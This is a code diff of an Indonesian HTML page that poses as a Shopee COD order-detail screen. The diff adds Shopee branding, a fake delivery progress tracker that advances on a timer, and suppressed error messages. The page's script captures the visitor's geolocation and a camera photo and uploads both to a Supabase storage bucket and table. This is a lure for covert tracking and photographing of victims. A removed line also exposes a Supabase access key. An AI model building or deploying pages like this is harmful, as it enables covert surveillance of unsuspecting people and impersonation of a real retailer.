@@ -3,118 +3,188 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CEK PAKET COD MU DISINI</title>
-<!-- Google Fonts -->
+<title>Shopee - Detail Pesanan COD</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     font-family: 'Poppins', sans-serif;
-    background: #f9f9f9;
+    background: #f5f5f5;
     color: #333;
     min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
   }
+
+  /* Header Shopee */
   header {
     background-color: #f53d2d;
     color: #fff;
-    width: 100%;
-    padding: 16px 0;
-    font-size: 1.5rem;
+    padding: 14px;
+    font-size: 1.3rem;
     font-weight: 600;
     text-align: center;
-    box-shadow: 0 3px 8px rgba(0,0,0,0.12);
+    box-shadow: 0 2px 6px rgba(0,0,0,0.15);
     position: sticky;
     top: 0;
     z-index: 100;
-    user-select: none;
   }
-  #status {
-    margin: 20px auto;
-    padding: 14px 20px;
-    border-radius: 16px;
-    background: #fff4f2;
-    color: #f53d2d;
-    font-weight: 600;
-    font-size: 1.1rem;
+
+  /* Status Pesanan */
+  #statusBox {
+    margin: 16px;
+    padding: 16px;
+    border-radius: 12px;
+    background: #fff;
+    color: #333;
+    font-size: 1rem;
+    font-weight: 500;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+  }
+  #statusText { font-weight: 600; }
+
+  /* Progress Shopee */
+  .progress {
     display: flex;
-    align-items: center;
-    gap: 12px;
-    max-width: 360px;
-    box-shadow: 0 4px 12px rgba(245, 61, 45, 0.15);
-    user-select: none;
+    justify-content: space-between;
+    margin-top: 12px;
+    position: relative;
+  }
+  .progress::before {
+    content: "";
+    position: absolute;
+    top: 12px;
+    left: 10%;
+    width: 80%;
+    height: 2px;
+    background: #ddd;
+  }
+  .step {
+    background: #ddd;
+    color: #666;
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
     text-align: center;
+    line-height: 24px;
+    font-size: 0.8rem;
+    position: relative;
+    z-index: 1;
   }
-  /* Loading animasi */
-  .loading { display: inline-flex; gap: 6px; width: 80px; height: 20px; }
-  .loading div {
-    width: 14px; height: 14px; border-radius: 50%; background: #f53d2d;
-    animation-timing-function: cubic-bezier(0, 1, 1, 0);
+  .step.active {
+    background: #f53d2d;
+    color: #fff;
   }
-  .loading div:nth-child(1) { animation: loading1 0.6s infinite; }
-  .loading div:nth-child(2) { animation: loading2 0.6s infinite; animation-delay: 0.15s; }
-  .loading div:nth-child(3) { animation: loading2 0.6s infinite; animation-delay: 0.3s; }
-  .loading div:nth-child(4) { animation: loading3 0.6s infinite; animation-delay: 0.45s; }
-  @keyframes loading1 { 0% { transform: scale(0); } 100% { transform: scale(1); } }
-  @keyframes loading2 { 0% { transform: translateX(0); } 100% { transform: translateX(24px); } }
-  @keyframes loading3 { 0% { transform: scale(1); } 100% { transform: scale(0); } }
+
+  /* Daftar Foto/Lokasi */
   #list {
-    width: 100%; max-width: 960px; margin: 0 auto 40px;
-    display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
-    gap: 20px; padding: 0 16px;
+    margin: 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
   }
   .card {
-    background: #fff; border-radius: 20px;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-    overflow: hidden; cursor: pointer;
-    transition: transform 0.3s ease, box-shadow 0.3s ease;
-    display: flex; flex-direction: column;
+    background: #fff;
+    border-radius: 12px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+    overflow: hidden;
+    display: flex;
+    gap: 12px;
+    padding: 12px;
+    align-items: center;
   }
-  .card:hover { transform: translateY(-6px); box-shadow: 0 12px 24px rgba(245,61,45,0.25); }
-  .card img { width: 100%; height: 140px; object-fit: cover; border-bottom: 1px solid #eee; }
-  .info { padding: 12px 14px; font-size: 0.9rem; color: #666; white-space: pre-line; }
-  @media (max-width: 480px) {
-    #list { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 16px; }
-    .card img { height: 120px; }
+  .card img {
+    width: 90px;
+    height: 90px;
+    object-fit: cover;
+    border-radius: 8px;
+    flex-shrink: 0;
   }
+  .info {
+    font-size: 0.85rem;
+    color: #444;
+    white-space: pre-line;
+  }
+
+  /* Tombol */
+  .actions {
+    display: flex;
+    justify-content: flex-end;
+    gap: 10px;
+    margin: 16px;
+  }
+  button {
+    border: none;
+    border-radius: 8px;
+    padding: 10px 16px;
+    font-size: 0.9rem;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .btn-track { background: #fff; border: 1px solid #ccc; }
+  .btn-confirm { background: #f53d2d; color: #fff; }
 </style>
 </head>
 <body>
-<header>CEK PAKET COD MU DISINI</header>
+<header>Detail Pesanan COD</header>
 
-<div id="status">
-  <div class="loading"><div></div><div></div><div></div><div></div></div>
-  <span> Sedang diproses...</span>
+<div id="statusBox">
+  <div id="statusText">Pesanan COD kamu sedang diproses</div>
+  <div class="progress">
+    <div class="step active" id="step1">1</div>
+    <div class="step" id="step2">2</div>
+    <div class="step" id="step3">3</div>
+  </div>
 </div>
 
 <div id="list"></div>
+
+<div class="actions">
+  <button class="btn-track">Lacak Pesanan</button>
+  <button class="btn-confirm">Konfirmasi COD</button>
+</div>
 
 <!-- Supabase JS -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <script>
   const SUPABASE_URL = "https://sinqdlsddldljlqvsxoa.supabase.co";
-  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNpbnFkbHNkZGxkbGpscXZzeG9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Mzg4MDcsImV4cCI6MjA3MjIxNDgwN30.PdO2Fl37xYkG0T9skBJ9R7VTi553-iSUZGBm1L4yTkE";
+  const SUPABASE_KEY = "ISI_KEY_MU";
   const BUCKET = "foto-users"; 
   const { createClient } = supabase;
   const client = createClient(SUPABASE_URL, SUPABASE_KEY);
-  const statusEl = document.getElementById("status");
+
+  const statusText = document.getElementById("statusText");
+  const step1 = document.getElementById("step1");
+  const step2 = document.getElementById("step2");
+  const step3 = document.getElementById("step3");
   const listEl = document.getElementById("list");
+
+  function updateStatus(stage) {
+    step1.classList.remove("active");
+    step2.classList.remove("active");
+    step3.classList.remove("active");
+
+    if (stage === 1) {
+      statusText.innerText = "Pesanan COD kamu sedang diproses";
+      step1.classList.add("active");
+    } else if (stage === 2) {
+      statusText.innerText = "Pesanan sedang dikirim";
+      step2.classList.add("active");
+    } else if (stage === 3) {
+      statusText.innerText = "Pesanan selesai";
+      step3.classList.add("active");
+    }
+  }
 
   function ambilLokasiDulu() {
     if (!navigator.geolocation) {
-      statusEl.innerText = "❌ Browser tidak mendukung geolocation";
+      statusText.innerText = "❌ Browser tidak mendukung geolocation";
       return;
     }
-
     navigator.geolocation.getCurrentPosition(async (pos) => {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
-      statusEl.innerText = "✅ nyalakan izin";
       ambilFoto(lat, lon);
     }, (err) => {
-      statusEl.innerText = "❌ aktifkan izin lokasi: " + err.message;
+      statusText.innerText = "❌ Aktifkan izin lokasi: " + err.message;
     });
   }
 
@@ -134,18 +204,23 @@
           contentType: "image/jpeg"
         });
 
-      if (uploadError) {
-        statusEl.innerText = "❌ Gagal upload: " + uploadError.message;
-      } else {
+      if (!uploadError) {
         await client.from("lokasi_users").insert([
           { foto: fileName, latitude: lat, longitude: lon, created_at: new Date() }
         ]);
-        statusEl.innerText = "✅ Oke paket COD mu otw dianter";
         tampilkanFoto();
+
+        // Ubah status setelah berhasil upload
+        updateStatus(2);
+
+        // Simulasi otomatis selesai setelah 10 detik
+        setTimeout(() => {
+          updateStatus(3);
+        }, 10000);
       }
       track.stop();
     } catch (err) {
-      statusEl.innerText = "❌ aktifkan izin kamera: " + err;
+      console.error("Kamera error:", err);
     }
   }
 
@@ -153,10 +228,7 @@
     const { data, error } = await client.storage.from(BUCKET).list("", {
       sortBy: { column: "created_at", order: "desc" }
     });
-    if (error) {
-      listEl.innerHTML = "<p style='color:red;'>Gagal ambil daftar foto</p>";
-      return;
-    }
+    if (error) return;
 
     listEl.innerHTML = "";
     for (const file of data) {
@@ -175,8 +247,6 @@
       info.className = "info";
       if (lokasiData) {
         info.innerText = `Lat: ${lokasiData.latitude.toFixed(5)}, Lon: ${lokasiData.longitude.toFixed(5)}\n${new Date(lokasiData.created_at).toLocaleString()}`;
-      } else {
-        info.innerText = "Lokasi tidak tersedia";
       }
       card.appendChild(img);
       card.appendChild(info);
@@ -184,9 +254,9 @@
     }
   }
 
-  // mulai: minta lokasi dulu
+  // mulai
+  updateStatus(1);
   ambilLokasiDulu();
 </script>
 </body>
 </html>
-
